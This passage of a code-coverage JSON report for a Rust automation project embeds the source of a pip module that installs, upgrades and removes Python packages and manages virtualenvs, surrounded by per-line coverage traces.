ss":[30864735,30864684],"length":1,"stats":{"Line":0}},{"line":308,"address":[30864703,30864657],"length":1,"stats":{"Line":0}},{"line":312,"address":[30864606],"length":1,"stats":{"Line":0}},{"line":313,"address":[30864802,30864853],"length":1,"stats":{"Line":0}},{"line":315,"address":[30864821,30864775],"length":1,"stats":{"Line":0}},{"line":320,"address":[30864885,30864627],"length":1,"stats":{"Line":0}},{"line":326,"address":[30857293],"length":1,"stats":{"Line":0}},{"line":327,"address":[30857329,30862926,30862947],"length":1,"stats":{"Line":0}},{"line":328,"address":[30864128],"length":1,"stats":{"Line":0}},{"line":330,"address":[30864088,30862986],"length":1,"stats":{"Line":0}},{"line":334,"address":[30862940],"length":1,"stats":{"Line":0}},{"line":335,"address":[30863101,30863024],"length":1,"stats":{"Line":0}},{"line":336,"address":[30863107,30863172],"length":1,"stats":{"Line":0}},{"line":338,"address":[30863522,30863136],"length":1,"stats":{"Line":0}},{"line":339,"address":[30863528,30863595],"length":1,"stats":{"Line":0}},{"line":342,"address":[30863951,30863565],"length":1,"stats":{"Line":0}},{"line":346,"address":[30857302],"length":1,"stats":{"Line":0}},{"line":347,"address":[30857310],"length":1,"stats":{"Line":0}},{"line":349,"address":[30857435,30857358],"length":1,"stats":{"Line":0}},{"line":350,"address":[30857457],"length":1,"stats":{"Line":0}},{"line":351,"address":[30859122,30857604,30857493],"length":1,"stats":{"Line":0}},{"line":353,"address":[30857968],"length":1,"stats":{"Line":0}},{"line":354,"address":[30858216],"length":1,"stats":{"Line":0}},{"line":356,"address":[30858088,30857980],"length":1,"stats":{"Line":0}},{"line":360,"address":[30857994],"length":1,"stats":{"Line":0}},{"line":361,"address":[30858698,30858002],"length":1,"stats":{"Line":0}},{"line":362,"address":[30858804,30858899,30858938],"length":1,"stats":{"Line":0}},{"line":366,"address":[30859156,30857464],"length":1,"stats":{"Line":0}},{"line":367,"address":[30859178],"length":1,"stats":{"Line":0}},{"line":368,"address":[30859223,30859334,30860852],"length":1,"stats":{"Line":0}},{"line":370,"address":[30859698],"length":1,"stats":{"Line":0}},{"line":371,"address":[30859946],"length":1,"stats":{"Line":0}},{"line":373,"address":[30859818,30859710],"length":1,"stats":{"Line":0}},{"line":377,"address":[30859724],"length":1,"stats":{"Line":0}},{"line":378,"address":[30860428,30859732],"length":1,"stats":{"Line":0}},{"line":379,"address":[30860534,30860629,30860668],"length":1,"stats":{"Line":0}},{"line":383,"address":[30860895,30859185],"length":1,"stats":{"Line":0}},{"line":384,"address":[30861001,30862740,30862779],"length":1,"stats":{"Line":0}},{"line":387,"address":[30861023],"length":1,"stats":{"Line":0}},{"line":388,"address":[30861072],"length":1,"stats":{"Line":0}},{"line":389,"address":[30861413,30861336],"length":1,"stats":{"Line":0}},{"line":390,"address":[30861499,30861419],"length":1,"stats":{"Line":0}},{"line":392,"address":[30861454,30861864],"length":1,"stats":{"Line":0}},{"line":393,"address":[30861870,30861955],"length":1,"stats":{"Line":0}},{"line":396,"address":[30861913,30862603,30862329,30862516],"length":1,"stats":{"Line":0}},{"line":397,"address":[30862441,30862524,30862730,30862434],"length":1,"stats":{"Line":0}},{"line":400,"address":[30861033,30861098,30861211],"length":1,"stats":{"Line":0}},{"line":401,"address":[30861136,30861326,30861219,30861129],"length":1,"stats":{"Line":0}},{"line":406,"address":[30853696,30854096,30854102],"length":1,"stats":{"Line":0}},{"line":411,"address":[30854032],"length":1,"stats":{"Line":0}},{"line":414,"address":[30848560,30849377,30849371],"length":1,"stats":{"Line":0}},{"line":415,"address":[30849411,30848626],"length":1,"stats":{"Line":0}},{"line":416,"address":[30848939,30849078],"length":1,"stats":{"Line":0}},{"line":418,"address":[30848962],"length":1,"stats":{"Line":0}},{"line":419,"address":[30849390],"length":1,"stats":{"Line":0}},{"line":420,"address":[30849424],"length":1,"stats":{"Line":0}},{"line":424,"address":[30849470,30849253,30849740],"length":1,"stats":{"Line":0}},{"line":425,"address":[30849692],"length":1,"stats":{"Line":0}},{"line":427,"address":[30849752,30849838,30853585],"length":1,"stats":{"Line":0}},{"line":430,"address":[30850364,30850280,30853583],"length":1,"stats":{"Line":0}},{"line":432,"address":[26459020,26459008],"length":1,"stats":{"Line":0}},{"line":433,"address":[30853562,30850538,30850459],"length":1,"stats":{"Line":0}},{"line":435,"address":[30850688],"length":1,"stats":{"Line":0}},{"line":436,"address":[30850707],"length":1,"stats":{"Line":0}},{"line":438,"address":[30850850,30850770],"length":1,"stats":{"Line":0}},{"line":439,"address":[30850950,30851487,30853522],"length":1,"stats":{"Line":0}},{"line":440,"address":[30851795,30853501,30851711],"length":1,"stats":{"Line":0}},{"line":441,"address":[30851637,30851763],"length":1,"stats":{"Line":0}},{"line":444,"address":[30851883],"length":1,"stats":{"Line":0}},{"line":446,"address":[30851916],"length":1,"stats":{"Line":0}},{"line":447,"address":[30853105,30852765],"length":1,"stats":{"Line":0}},{"line":448,"address":[30853283],"length":1,"stats":{"Line":0}},{"line":450,"address":[30852730,30852811],"length":1,"stats":{"Line":0}},{"line":451,"address":[30852946],"length":1,"stats":{"Line":0}},{"line":455,"address":[30851933],"length":1,"stats":{"Line":0}},{"line":456,"address":[30851982,30852385],"length":1,"stats":{"Line":0}},{"line":457,"address":[30852563],"length":1,"stats":{"Line":0}},{"line":459,"address":[30852072,30851947],"length":1,"stats":{"Line":0}},{"line":460,"address":[30852207],"length":1,"stats":{"Line":0}},{"line":466,"address":[30851224,30851169],"length":1,"stats":{"Line":0}},{"line":467,"address":[30850978],"length":1,"stats":{"Line":0}},{"line":468,"address":[30851057,30851137],"length":1,"stats":{"Line":0}}],"covered":24,"coverable":231},{"path":["/","home","artur","Repositories","rustible","src","modules","pip.rs"],"content":"//! Pip module - Python package management\n//!\n//! This module manages Python packages using pip, supporting virtualenvs,\n//! requirements files, and different package states.\n\nuse super::{\n    Diff, Module, ModuleClassification, ModuleContext, ModuleError, ModuleOutput, ModuleParams,\n    ModuleResult, ParallelizationHint, ParamExt,\n};\nuse std::collections::HashMap;\nuse std::process::Command;\n\n/// Desired state for a pip package\n#[derive(Debug, Clone, PartialEq)]\npub enum PipState {\n    Present,\n    Absent,\n    Latest,\n}\n\nimpl PipState {\n    fn from_str(s: \u0026str) -\u003e ModuleResult\u003cSelf\u003e {\n        match s.to_lowercase().as_str() {\n            \"present\" | \"installed\" =\u003e Ok(PipState::Present),\n            \"absent\" | \"removed\" =\u003e Ok(PipState::Absent),\n            \"latest\" =\u003e Ok(PipState::Latest),\n            _ =\u003e Err(ModuleError::InvalidParameter(format!(\n                \"Invalid state '{}'. Valid states: present, absent, latest\",\n                s\n            ))),\n        }\n    }\n}\n\n/// Module for pip package management\npub struct PipModule;\n\nimpl PipModule {\n    /// Build the pip command based on virtualenv settings\n    fn build_pip_command(\u0026self, params: \u0026ModuleParams) -\u003e ModuleResult\u003cString\u003e {\n        let executable = params\n            .get_string(\"executable\")?\n            .unwrap_or_else(|| \"pip3\".to_string());\n\n        // If virtualenv is specified, use the pip from that virtualenv\n        if let Some(venv) = params.get_string(\"virtualenv\")? {\n            Ok(format!(\"{}/bin/pip\", venv))\n        } else {\n            Ok(executable)\n        }\n    }\n\n    /// Check if a package is installed\n    fn is_package_installed(\u0026self, pip_cmd: \u0026str, package: \u0026str) -\u003e ModuleResult\u003cbool\u003e {\n        let output = Command::new(pip_cmd)\n            .arg(\"show\")\n            .arg(package)\n            .output()\n            .map_err(|e| {\n                ModuleError::ExecutionFailed(format!(\"Failed to check package status: {}\", e))\n            })?;\n        Ok(output.status.success())\n    }\n\n    /// Get installed version of a package\n    fn get_installed_version(\u0026self, pip_cmd: \u0026str, package: \u0026str) -\u003e ModuleResult\u003cOption\u003cString\u003e\u003e {\n        let output = Command::new(pip_cmd)\n            .arg(\"show\")\n            .arg(package)\n            .output()\n            .map_err(|e| {\n                ModuleError::ExecutionFailed(format!(\"Failed to get package version: {}\", e))\n            })?;\n\n        if output.status.success() {\n            // Parse the output to find the Version line\n            let stdout = String::from_utf8_lossy(\u0026output.stdout);\n            for line in stdout.lines() {\n                if let Some(version) = line.strip_prefix(\"Version:\") {\n                    let version = version.trim().to_string();\n                    if version.is_empty() {\n                        return Ok(None);\n                    }\n                    return Ok(Some(version));\n                }\n            }\n            Ok(None)\n        } else {\n            Ok(None)\n        }\n    }\n\n    /// Execute a pip command\n    fn execute_pip_command(\n        \u0026self,\n        pip_cmd: \u0026str,\n        args: \u0026[\u0026str],\n    ) -\u003e ModuleResult\u003c(bool, String, String)\u003e {\n        let output = Command::new(pip_cmd).args(args).output().map_err(|e| {\n            ModuleError::ExecutionFailed(format!(\"Failed to execute pip command: {}\", e))\n        })?;\n\n        let stdout = String::from_utf8_lossy(\u0026output.stdout).to_string();\n        let stderr = String::from_utf8_lossy(\u0026output.stderr).to_string();\n\n        Ok((output.status.success(), stdout, stderr))\n    }\n\n    /// Create a virtualenv if it doesn't exist\n    fn ensure_virtualenv(\u0026self, venv_path: \u0026str) -\u003e ModuleResult\u003cbool\u003e {\n        // Check if virtualenv exists by checking for the activate script\n        let activate_path = std::path::Path::new(venv_path).join(\"bin\").join(\"activate\");\n        if activate_path.exists() {\n            return Ok(false);\n        }\n\n        // Create virtualenv using safe argument passing\n        let output = Command::new(\"python3\")\n            .arg(\"-m\")\n            .arg(\"venv\")\n            .arg(venv_path)\n            .output()\n            .map_err(|e| {\n                ModuleError::ExecutionFailed(format!(\"Failed to create virtualenv: {}\", e))\n            })?;\n\n        if !output.status.success() {\n            return Err(ModuleError::ExecutionFailed(format!(\n                \"Failed to create virtualenv: {}\",\n                String::from_utf8_lossy(\u0026output.stderr)\n            )));\n        }\n\n        Ok(true)\n    }\n\n    /// Handle requirements file installation\n    fn handle_requirements(\n        \u0026self,\n        pip_cmd: \u0026str,\n        requirements: \u0026str,\n        state: \u0026PipState,\n        venv_created: bool,\n        context: \u0026ModuleContext,\n    ) -\u003e ModuleResult\u003cModuleOutput\u003e {\n        if *state == PipState::Absent {\n            return Err(ModuleError::InvalidParameter(\n                \"state=absent is not supported with requirements parameter\".to_string(),\n            ));\n        }\n\n        if context.check_mode {\n            let mut msg = String::new();\n            if venv_created {\n                msg.push_str(\"Would create virtualenv. \");\n            }\n            msg.push_str(\u0026format!(\n                \"Would install packages from requirements file: {}\",\n                requirements\n            ));\n            return Ok(ModuleOutput::changed(msg));\n        }\n\n        let args = if *state == PipState::Latest {\n            vec![\"install\", \"--upgrade\", \"-r\", requirements]\n        } else {\n            vec![\"install\", \"-r\", requirements]\n        };\n\n        let (success, stdout, stderr) = self.execute_pip_command(pip_cmd, \u0026args)?;\n\n        if !success {\n            return Err(ModuleError::ExecutionFailed(format!(\n                \"Failed to install from requirements: {}\",\n                if stderr.is_empty() { stdout } else { stderr }\n            )));\n        }\n\n        // Check if anything was actually installed by looking for \"already satisfied\" in output\n        let changed = !stdout.contains(\"Requirement already satisfied\");\n\n        if changed || venv_created {\n            Ok(ModuleOutput::changed(format!(\n                \"Installed packages from requirements file: {}\",\n                requirements\n            ))\n            .with_command_output(Some(stdout), Some(stderr), Some(0)))\n        } else {\n            Ok(\n                ModuleOutput::ok(\"All requirements already satisfied\".to_string())\n                    .with_command_output(Some(stdout), Some(stderr), Some(0)),\n            )\n        }\n    }\n}\n\nimpl Module for PipModule {\n    fn name(\u0026self) -\u003e \u0026'static str {\n        \"pip\"\n    }\n\n    fn description(\u0026self) -\u003e \u0026'static str {\n        \"Manage Python packages with pip\"\n    }\n\n    fn classification(\u0026self) -\u003e ModuleClassification {\n        ModuleClassification::RemoteCommand\n    }\n\n    fn parallelization_hint(\u0026self) -\u003e ParallelizationHint {\n        // Pip can generally run in parallel, but virtualenv operations might conflict\n        ParallelizationHint::FullyParallel\n    }\n\n    fn required_params(\u0026self) -\u003e \u0026[\u0026'static str] {\n        // Either 'name' or 'requirements' must be provided\n        \u0026[]\n    }\n\n    fn validate_params(\u0026self, params: \u0026ModuleParams) -\u003e ModuleResult\u003c()\u003e {\n        // Must have either name or requirements\n        if params.get(\"name\").is_none() \u0026\u0026 params.get(\"requirements\").is_none() {\n            return Err(ModuleError::MissingParameter(\n                \"Either 'name' or 'requirements' must be provided\".to_string(),\n            ));\n        }\n        Ok(())\n    }\n\n    fn execute(\n        \u0026self,\n        params: \u0026ModuleParams,\n        context: \u0026ModuleContext,\n    ) -\u003e ModuleResult\u003cModuleOutput\u003e {\n        let pip_cmd = self.build_pip_command(params)?;\n\n        // Get state\n        let state_str = params\n            .get_string(\"state\")?\n            .unwrap_or_else(|| \"present\".to_string());\n        let state = PipState::from_str(\u0026state_str)?;\n\n        // Handle virtualenv creation if needed\n        let mut venv_created = false;\n        if let Some(venv) = params.get_string(\"virtualenv\")? {\n            if !context.check_mode {\n                venv_created = self.ensure_virtualenv(\u0026venv)?;\n            }\n        }\n\n        // Handle requirements file\n        if let Some(requirements) = params.get_string(\"requirements\")? {\n            return self.handle_requirements(\n                \u0026pip_cmd,\n                \u0026requirements,\n                \u0026state,\n                venv_created,\n                context,\n            );\n        }\n\n        // Handle individual packages\n        let packages: Vec\u003cString\u003e = if let Some(names) = params.get_vec_string(\"name\")? {\n            names\n        } else {\n            vec![params.get_string_required(\"name\")?]\n        };\n\n        let mut to_install: Vec\u003cString\u003e = Vec::new();\n        let mut to_remove: Vec\u003cString\u003e = Vec::new();\n        let mut already_ok: Vec\u003cString\u003e = Vec::new();\n\n        for package in \u0026packages {\n            let is_installed = self.is_package_installed(\u0026pip_cmd, package)?;\n\n            match state {\n                PipState::Present =\u003e {\n                    if is_installed {\n                        already_ok.push(package.clone());\n                    } else {\n                        to_install.push(package.clone());\n                    }\n                }\n                PipState::Absent =\u003e {\n                    if is_installed {\n                        to_remove.push(package.clone());\n                    } else {\n                        already_ok.push(package.clone());\n                    }\n                }\n                PipState::Latest =\u003e {\n                    // For 'latest', we always try to install/upgrade\n                    to_install.push(package.clone());\n                }\n            }\n        }\n\n        // Check mode - return what would happen\n        if context.check_mode {\n            if to_install.is_empty() \u0026\u0026 to_remove.is_empty() \u0026\u0026 !venv_created {\n                return Ok(ModuleOutput::ok(format!(\n                    \"All packages already in desired state: {}\",\n                    already_ok.join(\", \")\n                )));\n            }\n\n            let mut msg = String::new();\n            if venv_created {\n                msg.push_str(\"Would create virtualenv. \");\n            }\n            if !to_install.is_empty() {\n                msg.push_str(\u0026format!(\"Would install: {}. \", to_install.join(\", \")));\n            }\n            if !to_remove.is_empty() {\n                msg.push_str(\u0026format!(\"Would remove: {}. \", to_remove.join(\", \")));\n            }\n\n            return Ok(ModuleOutput::changed(msg.trim().to_string()));\n        }\n\n        // Perform the actual operations\n        let mut changed = venv_created;\n        let mut results: HashMap\u003cString, String\u003e = HashMap::new();\n\n        if !to_install.is_empty() {\n            let install_args = if state == PipState::Latest {\n                vec![\"install\", \"--upgrade\"]\n            } else {\n                vec![\"install\"]\n            };\n\n            let mut args = install_args;\n            for pkg in \u0026to_install {\n                args.push(pkg);\n            }\n\n            let (success, stdout, stderr) = self.execute_pip_command(\u0026pip_cmd, \u0026args)?;\n\n            if !success {\n                return Err(ModuleError::ExecutionFailed(format!(\n                    \"Failed to install packages: {}\",\n                    if stderr.is_empty() { stdout } else { stderr }\n                )));\n            }\n\n            changed = true;\n            for pkg in \u0026to_install {\n                results.insert(pkg.clone(), \"installed\".to_string());\n            }\n        }\n\n        if !to_remove.is_empty() {\n            let mut args = vec![\"uninstall\", \"-y\"];\n            for pkg in \u0026to_remove {\n                args.push(pkg);\n            }\n\n            let (success, stdout, stderr) = self.execute_pip_command(\u0026pip_cmd, \u0026args)?;\n\n            if !success {\n                return Err(ModuleError::ExecutionFailed(format!(\n                    \"Failed to remove packages: {}\",\n                    if stderr.is_empty() { stdout } else { stderr }\n                )));\n            }\n\n            changed = true;\n            for pkg in \u0026to_remove {\n                results.insert(pkg.clone(), \"removed\".to_string());\n            }\n        }\n\n        for pkg in \u0026already_ok {\n            results.insert(pkg.clone(), \"ok\".to_string());\n        }\n\n        if changed {\n            let mut msg = String::new();\n            if venv_created {\n                msg.push_str(\"Virtualenv created. \");\n            }\n            if !to_install.is_empty() {\n                msg.push_str(\u0026format!(\"Installed: {}. \", to_install.join(\", \")));\n            }\n            if !to_remove.is_empty() {\n                msg.push_str(\u0026format!(\"Removed: {}. \", to_remove.join(\", \")));\n            }\n\n            Ok(ModuleOutput::changed(msg.trim().to_string())\n                .with_data(\"results\", serde_json::json!(results)))\n        } else {\n            Ok(\n                ModuleOutput::ok(\"All packages already in desired state\".to_string())\n                    .with_data(\"results\", serde_json::json!(results)),\n            )\n        }\n    }\n\n    fn check(\u0026self, params: \u0026ModuleParams, context: \u0026ModuleContext) -\u003e ModuleResult\u003cModuleOutput\u003e {\n        let check_context = ModuleContext {\n            check_mode: true,\n            ..context.clone()\n        };\n        self.execute(params, \u0026check_context)\n    }\n\n    fn diff(\u0026self, params: \u0026ModuleParams, _context: \u0026ModuleContext) -\u003e ModuleResult\u003cOption\u003cDiff\u003e\u003e {\n        let pip_cmd = self.build_pip_command(params)?;\n\n        // Get state\n        let state_str = params\n            .get_string(\"state\")?\n            .unwrap_or_else(|| \"present\".to_string());\n        let state = PipState::from_str(\u0026state_str)?;\n\n        // Handle requirements file differently\n        if let Some(requirements) = params.get_string(\"requirements\")? {\n            return Ok(Some(Diff::new(\n                \"(requirements not shown)\",\n                format!(\"Install from: {}\", requirements),\n            )));\n        }\n\n        // Handle individual packages\n        let packages: Vec\u003cString\u003e = if let Some(names) = params.get_vec_string(\"name\")? {\n            names\n        } else {\n            vec![params.get_string_required(\"name\")?]\n        };\n\n        let mut before_lines = Vec::new();\n        let mut after_lines = Vec::new();\n\n        for package in \u0026packages {\n            let is_installed = self.is_package_installed(\u0026pip_cmd, package)?;\n            let version = if is_installed {\n                self.get_installed_version(\u0026pip_cmd, package)?\n                    .unwrap_or_default()\n            } else {\n                String::new()\n            };\n\n            match state {\n                PipState::Present | PipState::Latest =\u003e {\n                    if is_installed {\n                        before_lines.push(format!(\"{}: {}\", package, version));\n                        if state == PipState::Latest {\n                            after_lines.push(format!(\"{}: (will be upgraded)\", package));\n                        } else {\n                            after_lines.push(format!(\"{}: {}\", package, version));\n                        }\n                    } else {\n                        before_lines.push(format!(\"{}: (not installed)\", package));\n                        after_lines.push(format!(\"{}: (will be installed)\", package));\n                    }\n                }\n                PipState::Absent =\u003e {\n                    if is_installed {\n                        before_lines.push(format!(\"{}: {}\", package, version));\n                        after_lines.push(format!(\"{}: (will be removed)\", package));\n                    } else {\n                        before_lines.push(format!(\"{}: (not installed)\", package));\n                        after_lines.push(format!(\"{}: (not installed)\", package));\n                    }\n                }\n            }\n        }\n\n        Ok(Some(Diff::new(\n            before_lines.join(\"\\n\"),\n            after_lines.join(\"\\n\"),\n        )))\n    }\n}\n\n#[cfg(test)]\nmod tests {\n    use super::*;\n\n    #[test]\n    fn test_pip_state_from_str() {\n        assert_eq!(PipState::from_str(\"present\").unwrap(), PipState::Present);\n        assert_eq!(PipState::from_str(\"installed\").unwrap(), PipState::Present);\n        assert_eq!(PipState::from_str(\"absent\").unwrap(), PipState::Absent);\n        assert_eq!(PipState::from_str(\"removed\").unwrap(), PipState::Absent);\n        assert_eq!(PipState::from_str(\"latest\").unwrap(), PipState::Latest);\n        assert!(PipState::from_str(\"invalid\").is_err());\n    }\n\n    #[test]\n    fn test_build_pip_command() {\n        let module = PipModule;\n        let mut params: ModuleParams = HashMap::new();\n\n        // Default pip command\n        let cmd = module.build_pip_command(\u0026params).unwrap();\n        assert_eq!(cmd, \"pip3\");\n\n        // Custom executable\n        params.insert(\"executable\".to_string(), serde_json::json!(\"pip\"));\n        let cmd = module.build_pip_command(\u0026params).unwrap();\n        assert_eq!(cmd, \"pip\");\n\n        // Virtualenv overrides executable\n        params.insert(\"virtualenv\".to_string(), serde_json::json!(\"/path/to/venv\"));\n        let cmd = module.build_pip_command(\u0026params).unwrap();\n        assert_eq!(cmd, \"/path/to/venv/bin/pip\");\n    }\n\n    #[test]\n    fn test_validate_params() {\n        let module = PipModule;\n\n        // Missing both name and requirements\n        let params: ModuleParams = HashMap::new();\n        assert!(module.validate_params(\u0026params).is_err());\n\n        // Has name\n        let mut params: ModuleParams = HashMap::new();\n        params.insert(\"name\".to_string(), serde_json::json!(\"requests\"));\n        assert!(module.validate_params(\u0026params).is_ok());\n\n        // Has requirements\n        let mut params: ModuleParams = HashMap::new();\n        params.insert(\n            \"requirements\".to_string(),\n            serde_json::json!(\"requirements.txt\"),\n        );\n        assert!(module.validate_params(\u0026params).is_ok());\n    }\n}\n","traces":[{"line":22,"address":[31550965,31550971,31550272],"length":1,"stats":{"Line":1}},{"line":23,"address":[31550299,31550401],"length":1,"stats":{"Line":2}},{"line":24,"address":[31550417],"length":1,"stats":{"Line":1}},{"line":25,"address":[31550530],"length":1,"stats":{"Line":1}},{"line":26,"address":[31550643,31550713],"length":1,"stats":{"Line":2}},{"line":27,"address":[31550735,31550681],"length":1,"stats":{"Line":2}},{"line":40,"address":[31551965,31551971,31550992],"length":1,"stats":{"Line":1}},{"line":41,"address":[31551166,31551066,31551196,31551036],"length":1,"stats":{"Line":3}},{"line":43,"address":[31551222],"length":1,"stats":{"Line":3}},{"line":46,"address":[31551259,31551705,31551343],"length":1,"stats":{"Line":3}},{"line":47,"address":[31551574,31551754],"length":1,"stats":{"Line":2}},{"line":49,"address":[31551609],"length":1,"stats":{"Line":1}},{"line":54,"address":[31558494,31558500,31557872],"length":1,"stats":{"Line":0}},{"line":55,"address":[31558146,31558227,31557978],"length":1,"stats":{"Line":0}},{"line":57,"address":[31558071],"length":1,"stats":{"Line":0}},{"line":59,"address":[31558123],"length":1,"stats":{"Line":0}},{"line":60,"address":[33281099,33281167],"length":1,"stats":{"Line":0}},{"line":62,"address":[31558424],"length":1,"stats":{"Line":0}},{"line":66,"address":[31558544,31560275,31560269],"length":1,"stats":{"Line":0}},{"line":67,"address":[31558655,31558940,31558856],"length":1,"stats":{"Line":0}},{"line":69,"address":[31558781],"length":1,"stats":{"Line":0}},{"line":71,"address":[31558833],"length":1,"stats":{"Line":0}},{"line":72,"address":[33281371,33281439],"length":1,"stats":{"Line":0}},{"line":75,"address":[31559256,31559152],"length":1,"stats":{"Line":0}},{"line":77,"address":[31559258,31559315],"length":1,"stats":{"Line":0}},{"line":78,"address":[31559425,31559334],"length":1,"stats":{"Line":0}},{"line":79,"address":[31559743,31559599],"length":1,"stats":{"Line":0}},{"line":80,"address":[31559826],"length":1,"stats":{"Line":0}},{"line":81,"address":[31559888,31559947],"length":1,"stats":{"Line":0}},{"line":82,"address":[31560128],"length":1,"stats":{"Line":0}},{"line":84,"address":[31559965],"length":1,"stats":{"Line":0}},{"line":87,"address":[31559650],"length":1,"stats":{"Line":0}},{"line":89,"address":[31559189],"length":1,"stats":{"Line":0}},{"line":94,"address":[31553472,31554655,31554661],"length":1,"stats":{"Line":0}},{"line":99,"address":[31553578,31553659,31553798],"length":1,"stats":{"Line":0}},{"line":100,"address":[33280895,33280827],"length":1,"stats":{"Line":0}},{"line":103,"address":[31554004],"length":1,"stats":{"Line":0}},{"line":104,"address":[31554193],"length":1,"stats":{"Line":0}},{"line":106,"address":[31554385],"length":1,"stats":{"Line":0}},{"line":110,"address":[31552080,31553447,31553395],"length":1,"stats":{"Line":0}},{"line":112,"address":[31552147],"length":1,"stats":{"Line":0}},{"line":113,"address":[31552373],"length":1,"stats":{"Line":0}},{"line":114,"address":[31552453],"length":1,"stats":{"Line":0}},{"line":118,"address":[31552751,31552421,31552670],"length":1,"stats":{"Line":0}},{"line":121,"address":[31552595],"length":1,"stats":{"Line":0}},{"line":123,"address":[31552647],"length":1,"stats":{"Line":0}},{"line":124,"address":[33280555,33280623],"length":1,"stats":{"Line":0}},{"line":127,"address":[31552963],"length":1,"stats":{"Line":0}},{"line":128,"address":[31553096],"length":1,"stats":{"Line":0}},{"line":130,"address":[31553069,31552992],"length":1,"stats":{"Line":0}},{"line":134,"address":[31553025],"length":1,"stats":{"Line":0}},{"line":138,"address":[31556586,31557411,31554704],"length":1,"stats":{"Line":0}},{"line":146,"address":[31554828],"length":1,"stats":{"Line":0}},{"line":147,"address":[31554922],"length":1,"stats":{"Line":0}},{"line":148,"address":[31554891],"length":1,"stats":{"Line":0}},{"line":152,"address":[31554873],"length":1,"stats":{"Line":0}},{"line":153,"address":[31555080],"length":1,"stats":{"Line":0}},{"line":154,"address":[31555108],"length":1,"stats":{"Line":0}},{"line":155,"address":[31557524,31557459],"length":1,"stats":{"Line":0}},{"line":157,"address":[31557432,31557711,31557526],"length":1,"stats":{"Line":0}},{"line":161,"address":[31557737],"length":1,"stats":{"Line":0}},{"line":164,"address":[31555062],"length":1,"stats":{"Line":0}},{"line":165,"address":[31555153,31555374],"length":1,"stats":{"Line":0}},{"line":167,"address":[31555197,31555121],"length":1,"stats":{"Line":0}},{"line":170,"address":[31555616,31557406,31555337],"length":1,"stats":{"Line":0}},{"line":172,"address":[31555902],"length":1,"stats":{"Line":0}},{"line":173,"address":[31556126],"length":1,"stats":{"Line":0}},{"line":175,"address":[31555914,31555998],"length":1,"stats":{"Line":0}},{"line":180,"address":[31555933,31556602],"length":1,"stats":{"Line":0}},{"line":182,"address":[31556647,31557344],"length":1,"stats":{"Line":0}},{"line":183,"address":[31557326,31556672,31557006],"length":1,"stats":{"Line":0}},{"line":187,"address":[31557129],"length":1,"stats":{"Line":0}},{"line":190,"address":[31556702],"length":1,"stats":{"Line":0}},{"line":191,"address":[31556756],"length":1,"stats":{"Line":0}},{"line":198,"address":[31537440],"length":1,"stats":{"Line":0}},{"line":202,"address":[31531312],"length":1,"stats":{"Line":0}},{"line":206,"address":[31531344],"length":1,"stats":{"Line":0}},{"line":210,"address":[31531648],"length":1,"stats":{"Line":0}},{"line":215,"address":[31531360],"length":1,"stats":{"Line":0}},{"line":220,"address":[31531376],"length":1,"stats":{"Line":1}},{"line":222,"address":[31531479,31531413],"length":1,"stats":{"Line":2}},{"line":223,"address":[31531547],"length":1,"stats":{"Line":1}},{"line":224,"address":[31531519],"length":1,"stats":{"Line":1}},{"line":227,"address":[31531456],"length":1,"stats":{"Line":1}},{"line":230,"address":[31537904,31539499,31550255],"length":1,"stats":{"Line":0}},{"line":235,"address":[31537990],"length":1,"stats":{"Line":0}},{"line":238,"address":[31550253,31538389,31538473],"length":1,"stats":{"Line":0}},{"line":240,"address":[31538530],"length":1,"stats":{"Line":0}},{"line":241,"address":[31550229,31538659,31538568],"length":1,"stats":{"Line":0}},{"line":244,"address":[31538820],"length":1,"stats":{"Line":0}},{"line":245,"address":[31538828,31550224],"length":1,"stats":{"Line":0}},{"line":246,"address":[31539121,31539453],"length":1,"stats":{"Line":0}},{"line":247,"address":[31539178,31539296],"length":1,"stats":{"Line":0}},{"line":252,"address":[31550219,31539140,31539521],"length":1,"stats":{"Line":0}},{"line":253,"address":[31539988],"length":1,"stats":{"Line":0}},{"line":254,"address":[31539755],"length":1,"stats":{"Line":0}},{"line":255,"address":[31539900],"length":1,"stats":{"Line":0}},{"line":257,"address":[31539979],"length":1,"stats":{"Line":0}},{"line":263,"address":[31540055,31540345,31539786,31550214],"length":1,"stats":{"Line":0}},{"line":264,"address":[31540297],"length":1,"stats":{"Line":0}},{"line":266,"address":[31550139,31540410,31540357],"length":1,"stats":{"Line":0}},{"line":269,"address":[31540372],"length":1,"stats":{"Line":0}},{"line":270,"address":[31540864],"length":1,"stats":{"Line":0}},{"line":271,"address":[31540924],"length":1,"stats":{"Line":0}},{"line":273,"address":[31540984,31541076],"length":1,"stats":{"Line":0}},{"line":274,"address":[31549509,31550074,31541198],"length":1,"stats":{"Line":0}},{"line":276,"address":[31549712],"length":1,"stats":{"Line":0}},{"line":278,"address":[31549753],"length":1,"stats":{"Line":0}},{"line":279,"address":[31549841,31549892],"length":1,"stats":{"Line":0}},{"line":281,"address":[31549814,31549860],"length":1,"stats":{"Line":0}},{"line":285,"address":[31549763],"length":1,"stats":{"Line":0}},{"line":286,"address":[31550010,31549959],"length":1,"stats":{"Line":0}},{"line":288,"address":[31549932,31549978],"length":1,"stats":{"Line":0}},{"line":293,"address":[31550042,31549784],"length":1,"stats":{"Line":0}},{"line":299,"address":[31541232],"length":1,"stats":{"Line":0}},{"line":300,"address":[31547944,31547968,31541274],"length":1,"stats":{"Line":0}},{"line":301,"address":[31548108],"length":1,"stats":{"Line":0}},{"line":303,"address":[31548017],"length":1,"stats":{"Line":0}},{"line":307,"address":[31547958],"length":1,"stats":{"Line":0}},{"line":308,"address":[31548352],"length":1,"stats":{"Line":0}},{"line":309,"address":[31548388,31548459],"length":1,"stats":{"Line":0}},{"line":311,"address":[31548468,31548362],"length":1,"stats":{"Line":0}},{"line":312,"address":[31548474,31548554],"length":1,"stats":{"Line":0}},{"line":314,"address":[31548919,31548509],"length":1,"stats":{"Line":0}},{"line":315,"address":[31548925,31548998],"length":1,"stats":{"Line":0}},{"line":318,"address":[31548965,31549354],"length":1,"stats":{"Line":0}},{"line":322,"address":[31541241],"length":1,"stats":{"Line":0}},{"line":323,"address":[31541255],"length":1,"stats":{"Line":0}},{"line":325,"address":[31541380,31541303],"length":1,"stats":{"Line":0}},{"line":326,"address":[31541451,31541386],"length":1,"stats":{"Line":0}},{"line":327,"address":[31541492,31541722],"length":1,"stats":{"Line":0}},{"line":329,"address":[31541467,31541518],"length":1,"stats":{"Line":0}},{"line":332,"address":[31541644],"length":1,"stats":{"Line":0}},{"line":333,"address":[31541676,31541930],"length":1,"stats":{"Line":0}},{"line":334,"address":[31543694,31542036],"length":1,"stats":{"Line":0}},{"line":337,"address":[31542070,31543651],"length":1,"stats":{"Line":0}},{"line":339,"address":[31542497],"length":1,"stats":{"Line":0}},{"li